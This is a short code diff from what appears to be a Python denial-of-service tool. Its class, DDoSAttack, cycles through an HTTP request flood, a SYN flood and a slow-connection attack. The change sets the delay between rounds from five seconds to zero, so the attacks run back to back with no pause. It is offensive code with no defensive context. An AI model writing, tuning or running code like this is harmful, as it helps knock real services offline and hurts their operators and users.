@@ -39,7 +39,7 @@ class DDoSAttack:
             self.ddos_requester()
             self.syn_flood()
             self.pyslow()
-            time.sleep(5)  # Wait a bit before restarting
+            time.sleep(0)  # Wait a bit before restarting
 
     def ddos_requester(self):
         headers = {
